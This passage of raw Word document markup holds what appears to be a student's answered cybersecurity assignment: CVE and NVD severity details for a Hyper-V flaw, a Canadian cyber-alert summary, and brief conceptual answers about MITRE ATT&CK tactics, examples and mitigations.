    <w:p w14:paraId="667E463D" w14:textId="3BF14952" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>To find more details about the vulnerability, click on Search CVE List TAB and provide CVE ID provided before. Click on the CVE link and then click on Learn more at National Vulnerability Database (NVD). Provide a brief description of identified vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3296A3E9" w14:textId="45BF237D" w:rsidR="009865DB" w:rsidRPr="009865DB" w:rsidRDefault="009865DB" w:rsidP="009865DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remote code execution vulnerability that happens when Hyper-V on a host server fails to validate input from an authenticated user on a guest operating system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15599177" w14:textId="77777777" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Severity : </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282E4D03" w14:textId="50C143B5" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Base Score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214F53AB" w14:textId="317F0D7D" w:rsidR="009865DB" w:rsidRPr="009865DB" w:rsidRDefault="009865DB" w:rsidP="009865DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>9.0 critical</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134D2A35" w14:textId="72354182" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Exploitability score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="001F14E9" w14:textId="5185FA9B" w:rsidR="009865DB" w:rsidRPr="009865DB" w:rsidRDefault="009865DB" w:rsidP="009865DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1258FCFD" w14:textId="1BEBDF55" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Attack vector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E37D3F" w14:textId="17F495F9" w:rsidR="009865DB" w:rsidRPr="009865DB" w:rsidRDefault="009865DB" w:rsidP="009865DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009865DB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Adjacent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEE1F31" w14:textId="1D2A1EF1" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Attack complexity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F1C0D7" w14:textId="4FB8312B" w:rsidR="009865DB" w:rsidRPr="009865DB" w:rsidRDefault="009865DB" w:rsidP="009865DB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009865DB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Low</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2F9E3A" w14:textId="77777777" w:rsidR="00A8750E" w:rsidRDefault="00A8750E" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>If provided CWE (Weakness Enumeration )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65042966" w14:textId="534B5CC5" w:rsidR="002A7D62" w:rsidRPr="009865DB" w:rsidRDefault="00BC7CED" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009865DB">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="009865DB">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="009865DB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CWE-20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542F3640" w14:textId="6AC96F5E" w:rsidR="00BC7CED" w:rsidRDefault="00BC7CED" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>( 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB3EA3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Access Canadian Center for Cybersecurity web site </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidRPr="00C10352">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.cyber.gc.ca/en/alerts-advisories</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">  and provide the following information about latest alert </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C25BAA7" w14:textId="1D83D222" w:rsidR="00BC7CED" w:rsidRDefault="00BC7CED" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Name and purpose of the alert</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6521160D" w14:textId="64D183AC" w:rsidR="00BA2996" w:rsidRPr="00BA2996" w:rsidRDefault="00BA2996" w:rsidP="00BA2996">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA2996">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>BM security advisory (AV22-028)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E768BFB" w14:textId="7ECA2993" w:rsidR="00BC7CED" w:rsidRDefault="00BC7CED" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Summarize the details of the alert</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA9D5E7" w14:textId="15801CE8" w:rsidR="00BA2996" w:rsidRDefault="00BA2996" w:rsidP="00BA2996">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
      </w:pPr>
      <w:r w:rsidRPr="00BA2996">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>IBM published Security Bulletins to address vulnerabilities in multiple products</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA2996">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E3F1A4" w14:textId="700F37BA" w:rsidR="00BC7CED" w:rsidRDefault="00BC7CED" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What are the suggested actions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D9D322" w14:textId="7E527845" w:rsidR="00BA2996" w:rsidRPr="00BA2996" w:rsidRDefault="00BA2996" w:rsidP="00BA2996">
      <w:pPr>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Update the provided list of updates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45612D04" w14:textId="77777777" w:rsidR="00BC7CED" w:rsidRDefault="00BC7CED" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41C56F27" w14:textId="77777777" w:rsidR="0006153A" w:rsidRDefault="0006153A" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E46139E" w14:textId="77777777" w:rsidR="0006153A" w:rsidRDefault="0006153A" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="716B762D" w14:textId="77777777" w:rsidR="0006153A" w:rsidRDefault="0006153A" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42A19E20" w14:textId="77777777" w:rsidR="0006153A" w:rsidRDefault="0006153A" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D3BFC2E" w14:textId="77777777" w:rsidR="0006153A" w:rsidRDefault="0006153A" w:rsidP="00BC7CED">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76EE3390" w14:textId="12141F38" w:rsidR="001B393C" w:rsidRPr="001B393C" w:rsidRDefault="00787FEF" w:rsidP="00A8750E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>( 10</w:t>
      </w:r>
      <w:r w:rsidR="00BC7CED" w:rsidRPr="00BB3EA3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r w:rsidR="00BC7CED">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001B393C">
        <w:t xml:space="preserve">Access the following attack framework web site  </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidR="001B393C" w:rsidRPr="006F34C8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://attack.mitre.org/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="04D1E636" w14:textId="32FE435F" w:rsidR="001B393C" w:rsidRDefault="003E32F1" w:rsidP="001B393C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="001B393C">
        <w:t>xplore attack</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="001B393C">
        <w:t xml:space="preserve"> matrix and provide the following information</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675D21B9" w14:textId="77777777" w:rsidR="001B393C" w:rsidRDefault="001B393C" w:rsidP="001B393C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79998A84" w14:textId="1091DE12" w:rsidR="00FD5CD8" w:rsidRDefault="001B393C" w:rsidP="00FD5CD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the purpose of this organization (</w:t>
      </w:r>
      <w:r w:rsidR="00B23767">
        <w:t xml:space="preserve">Attack </w:t>
      </w:r>
      <w:r>
        <w:t>framework) ?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4701044C" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="288538D9" w14:textId="0D0EB473" w:rsidR="00FD5CD8" w:rsidRDefault="00FD5CD8" w:rsidP="00FD5CD8">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>A knowledge base of attacker tactics publicly accessible to educate cybersecurity professionals</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082D5548" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="364D1EA8" w14:textId="715D573D" w:rsidR="001B393C" w:rsidRDefault="003E32F1" w:rsidP="001B393C">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">How many Enterprise Tactics are there? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E8C31C" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1800"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21199707" w14:textId="457A961C" w:rsidR="00BB3648" w:rsidRDefault="00BB3648" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ADD9302" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="00BB3648" w:rsidRDefault="004A6D14" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="160808AB" w14:textId="77777777" w:rsidR="00787FEF" w:rsidRDefault="003A55D0" w:rsidP="003A55D0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Click on </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidRPr="00C10352">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://attack.mitre.org/matrices/enterprise/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and analyze the different tactics and techniques for different operating systems</w:t>
      </w:r>
      <w:r w:rsidR="003E32F1">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154FCCE8" w14:textId="1D06A35F" w:rsidR="00B23767" w:rsidRDefault="003E32F1" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Find the </w:t>
      </w:r>
      <w:r w:rsidRPr="00787FEF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Defense Evasion </w:t>
      </w:r>
      <w:r w:rsidR="00787FEF" w:rsidRPr="00787FEF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tactic</w:t>
      </w:r>
      <w:r w:rsidR="00787FEF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="003A55D0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">provide </w:t>
      </w:r>
      <w:r w:rsidR="00787FEF">
        <w:t>a brief description of this tactic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B644D0" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03B77CE1" w14:textId="3D415DF7" w:rsidR="00BB3648" w:rsidRDefault="00BB3648" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>To avoid detection throughout an attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBE927E" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="00BB3648" w:rsidRDefault="004A6D14" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62CC7CF0" w14:textId="5BCD7BC1" w:rsidR="003E32F1" w:rsidRDefault="00787FEF" w:rsidP="00B23767">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Select one technique in this tactic and provide a brief description of the attack </w:t>
      </w:r>
      <w:r w:rsidR="003E32F1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75118C54" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C42B6B9" w14:textId="458E481D" w:rsidR="00BB3648" w:rsidRDefault="00BB3648" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Sudo and Sudo Caching: Attackers will do this to execute commands as other user or spawn processes at higher privileges</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E714E15" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="00BB3648" w:rsidRDefault="004A6D14" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A7E74FB" w14:textId="34CBEA1F" w:rsidR="003E32F1" w:rsidRDefault="00787FEF" w:rsidP="00B23767">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Provide o</w:t>
      </w:r>
      <w:r w:rsidR="003E32F1">
        <w:t>ne example of the attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE16621" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E2D08EA" w14:textId="1B17C2AD" w:rsidR="00BB3648" w:rsidRDefault="00BB3648" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Cobalt Strike tool can use sudo to run a command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799433A5" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="00BB3648" w:rsidRDefault="004A6D14" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="646AD154" w14:textId="568EDF18" w:rsidR="00787FEF" w:rsidRDefault="00787FEF" w:rsidP="00787FEF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Provide mitigation and detection of selected attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42118298" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3313BD38" w14:textId="557D496B" w:rsidR="00BB3648" w:rsidRDefault="00BB3648" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Privileged Account Management: Require a password so that even if an attacker gets terminal access they would require the password to exploit it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42767C64" w14:textId="77777777" w:rsidR="004A6D14" w:rsidRPr="00BB3648" w:rsidRDefault="004A6D14" w:rsidP="00BB3648">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2880"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="207A1E31" w14:textId="03C92456" w:rsidR="00787FEF" w:rsidRDefault="00787FEF" w:rsidP="00787FEF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Select a tactic of your choice. Describe the tactic and analyze one attack in the select tactic. Provide brief description , example, mitigation and detection of the attack </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D562976" w14:textId="0B677109" w:rsidR="00FD63ED" w:rsidRPr="0091160E" w:rsidRDefault="0091160E" w:rsidP="0091160E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execution: techniques that will allow an attacker to run their code on your system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EC8954" w14:textId="530D2198" w:rsidR="001B393C" w:rsidRDefault="00866775" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Attackers can abuse PowerShell commands and scripts for execution, EX. AppleSeed can execute its payload via PowerShell. Code Signing can mitigate an attack by only allowing signed scripts to run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39CE94FE" w14:textId="4536A6C5" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CA8ACE1" w14:textId="4DFD215C" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02F5964D" w14:textId="2293AD37" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1668D507" w14:textId="4EC120F1" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6219AE9E" w14:textId="0E4CC0EA" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3191787F" w14:textId="34C86F69" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0866EFBB" w14:textId="70079194" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D68C0E4" w14:textId="66BCDAD8" w:rsidR="004A6D14" w:rsidRDefault="004A6D14" w:rsidP="004A6D14">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
